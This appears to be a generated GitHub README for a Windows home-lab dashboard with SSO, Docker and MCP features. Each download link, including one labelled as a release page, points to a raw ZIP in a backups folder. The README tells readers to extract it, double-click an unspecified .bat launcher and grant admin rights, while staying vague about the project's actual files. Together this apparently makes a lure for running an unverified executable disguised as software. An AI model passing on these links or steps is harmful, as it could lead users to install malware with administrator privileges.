# 🏠 HomeLab_Dashboard_MCP_Integrated - Simple Home Lab Control, One Place

[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip)

## 📥 Download
Visit this page to download the Windows release:

[Download HomeLab_Dashboard_MCP_Integrated](https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip)

## 🖥️ What this app does
HomeLab_Dashboard_MCP_Integrated puts your home lab tools in one place. It gives you a single dashboard for everyday use, with sign-in, HTTPS, Docker support, and offline use.

It is built for people who want to open one screen and reach their services without juggling many tabs. It can also connect with agentic AI tools through MCP, so you can link your dashboard with local AI apps when you want that setup.

## ✨ Main features
- One dashboard for home lab apps
- Single sign-on with one login
- HTTPS for safer access in your browser
- Works with Docker Compose
- Runs offline after setup
- Modular layout for easier changes
- Built for self-hosted use
- Can connect with MCP tools
- Works well with OIDC login setups
- Can pair with local AI tools like Ollama and Open WebUI
- Fits airgapped setups where internet access is limited

## 🧰 What you need
Before you install, make sure you have:
- A Windows PC
- Admin access on that PC
- Enough disk space for the app and its containers
- Docker Desktop installed
- A web browser such as Edge, Chrome, or Firefox
- Basic internet access for the first download

If you plan to run it fully offline later, set it up once while you still have access to the release files and any needed images.

## 🚀 Getting started
Follow these steps on Windows:

1. Open the download page:
   [https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip](https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip)

2. Find the latest release.

3. Download the Windows package from that release. If there are more than one file, pick the one meant for Windows.

4. Save the file to a folder you can find, such as `Downloads` or `Desktop`.

5. If the download comes as a ZIP file, right-click it and choose **Extract All**.

6. Open the extracted folder.

7. Look for a file such as `start.bat`, `run.bat`, or a similar launcher.

8. Double-click the launcher to start the dashboard.

9. If Windows asks for permission, choose **Yes**.

10. Wait for Docker to start the services.

11. Open your browser and go to the local address shown by the app, such as `http://localhost:3000` or `https://localhost:8443`.

## 🔐 Sign-in and access
This app is set up for secure access. In a normal setup, you may use:
- A local admin account
- An SSO login
- OIDC sign-in
- A Keycloak-backed account flow

If your setup includes a login screen, use the account details from the release instructions or your own home lab settings.

If you run this for a family or small team, set up one clear admin account first. Then add other users as needed.

## 🌐 HTTPS setup
The app is built to use HTTPS. That means your browser can connect over a secure link.

In most setups, the app will:
- Create or use a local HTTPS config
- Serve the dashboard through a secure local address
- Work with a reverse proxy such as Caddy

If Windows shows a browser warning for a local certificate, this can happen with private home lab tools. Use the certificate method included in your release package if one is provided.

## 🐳 Docker setup
This project uses Docker Compose. That means the app runs as a set of containers instead of one large install.

You may see files such as:
- `docker-compose.yml`
- `.env`
- `caddy` config files
- service folders for dashboard parts

To start the app, the launcher usually calls Docker for you. If you prefer command line use, you can open a terminal in the app folder and run the compose file from there.

A typical flow looks like this:
1. Open the app folder
2. Start Docker Desktop
3. Run the launcher or compose setup
4. Wait for all containers to finish starting
5. Open the local web address in your browser

## 🧠 AI and MCP tools
This dashboard can work with agentic AI tools through MCP, which stands for Model Context Protocol.

In plain terms, that means the dashboard can connect to local AI services and give them a way to work with your home lab tools.

Common pairings include:
- Ollama for local models
- Open WebUI for chat-based access
- MCP servers for tool access
- Other self-hosted services in your network

You do not need to use the AI parts right away. The dashboard can run as a normal home lab front end on its own.

## 🏠 Typical home lab use
Use this app to manage things like:
- Media tools
- File services
- Status pages
- Admin links
- Containers
- Local AI tools
- Network tools
- Other self-hosted apps

It works well when you want:
- One home page for many services
- Fewer bookmarks
- One login for more than one tool
- A cleaner setup for your home server

## 🔁 Offline use
This project can run without the internet after setup. That makes it a fit for:
- Basement servers
- Small office labs
- Airgapped test setups
- Home networks with no outside access

For offline use, make sure you have:
- All needed release files
- Docker images already pulled
- Any local config files in place
- Your login setup ready before you disconnect

## 🧪 First run checklist
If the app does not open on the first try, check these items:

- Docker Desktop is running
- The launcher file was started as needed
- No other app is using the same port
- The browser cache is clear
- The release folder was fully extracted
- Windows Firewall is not blocking local access

If the dashboard opens but some tiles fail, the linked service may not be running yet.

## 🛠️ Common files you may see
Your release folder may include:
- `README.md`
- `docker-compose.yml`
- `start.bat`
- `stop.bat`
- `.env`
- config folders
- certificate files
- app data folders

Leave these files in place unless your release notes say to change them.

## 📌 Basic use
After the first start:
1. Open the dashboard in your browser
2. Sign in
3. Add or check your home lab links
4. Open services from the main screen
5. Use the dashboard as your starting page

If you run more than one service, keep the dashboard tab pinned in your browser for quick access.

## 🧩 Supported setup style
This app is made for:
- Windows users
- Docker users
- Home lab owners
- Self-hosted app users
- Local-only networks
- Offline-first setups
- SSO-based access
- Modular dashboard layouts

## 🆘 If something goes wrong
Try these steps in order:
1. Close the browser
2. Stop Docker Desktop
3. Start Docker Desktop again
4. Run the app launcher one more time
5. Wait a few minutes for all services to come up
6. Open the dashboard again
7. Restart Windows if the app still does not open

If a login page appears but does not accept your sign-in, check the account details from your setup files or release notes.

## 📂 Where to get the app
Download the Windows release here:

[https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip](https://raw.githubusercontent.com/CodeBy-red/HomeLab_Dashboard_MCP_Integrated/main/backups/Integrated-MC-Home-Lab-Dashboard-preredemption.zip)

## 🧭 What to expect after install
Once the app is running, you should see a web dashboard that acts as your main page for home lab tools. From there, you can open linked services, manage access, and keep everything in one place on your local network